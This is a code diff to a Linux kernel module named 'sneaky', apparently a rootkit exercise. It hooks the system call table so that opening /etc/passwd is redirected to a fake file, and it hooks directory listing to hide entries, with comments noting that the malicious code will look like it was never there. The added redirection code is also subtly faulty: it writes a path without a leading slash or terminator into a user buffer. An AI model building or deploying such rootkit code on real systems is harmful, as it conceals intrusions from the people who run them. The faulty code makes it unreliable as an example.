@@ -59,43 +59,19 @@ asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
 {
   // Implement the sneaky part here
   //return (*original_openat)(regs);
-  return 0;
+  const char * filename = regs->si;
+  const char * target = "/etc/passwd";
+  const char * fake = "tmp/passwd";
+  if(strcmp(filename, target) == 0){
+    copy_to_user(filename, fake, strlen(fake));
+  }
+  return original_openat(regs);
 
 }
 
-// asmlinkage int sneaky_sys_getdents64(int fd, void *dirp, size_t count)
-// {
-//   long nread;
-//   // Implement the sneaky part here
-//   nread = original_getdents64(fd, dirp, count);
-//   if (nread == -1)
-//     //handle_error("getdents");
-//     printk(KERN_INFO "Error in calling original getdents64\n");
-//   if (nread == 0)
-//     return 0;
-//   else{
-//     struct linux_dirent64 *d;
-//     long bpos = 0;
-//     for(; bpos < nread;){
-//       d = (struct linux_dirent64 *) ((char*)dirp + bpos);
-//       if(strcmp(d->d_name, PREFIX) == 0 || strcmp(d->d_name, "sneaky_pid") ==0){
-//         memmove((char*)dirp + bpos, (char*)dirp + bpos + d->d_reclen, nread - (bpos + d->d_reclen));
-//         nread -= d->d_reclen;   
-//       }
-//       else{
-//         bpos += d->d_reclen;
-//       }
-//     }
-//   }
-  
-//   return nread;
-// }
-
 asmlinkage int sneaky_sys_getdents64(struct pt_regs *regs){
   // Implement the sneaky part here
-  
   int nread;
-  
   unsigned long dirp = regs->si;
   nread = original_getdents64(regs);
 
@@ -153,7 +129,7 @@ static int initialize_sneaky_module(void)
   // This is the magic! Save away the original 'openat' system call
   // function address. Then overwrite its address in the system call
   // table with the function address of our new code.
-  //original_openat = (void *)sys_call_table[__NR_openat];
+  original_openat = (void *)sys_call_table[__NR_openat];
   original_getdents64 = (void *)sys_call_table[__NR_getdents64];
   //original_read = (void *)sys_call_table[__NR_read];
   
@@ -161,7 +137,7 @@ static int initialize_sneaky_module(void)
   enable_page_rw((void *)sys_call_table);
   
   // You need to replace other system calls you need to hack here
-  //sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
+  sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
   sys_call_table[__NR_getdents64] = (unsigned long)sneaky_sys_getdents64;
   //sys_call_table[__NR_read] = (unsigned long)sneaky_sys_read;
   
@@ -181,7 +157,7 @@ static void exit_sneaky_module(void)
 
   // This is more magic! Restore the original 'open' system call
   // function address. Will look like malicious code was never there!
-  //sys_call_table[__NR_openat] = (unsigned long)original_openat;
+  sys_call_table[__NR_openat] = (unsigned long)original_openat;
   sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
   //sys_call_table[__NR_read] = (unsigned long)original_read;
 
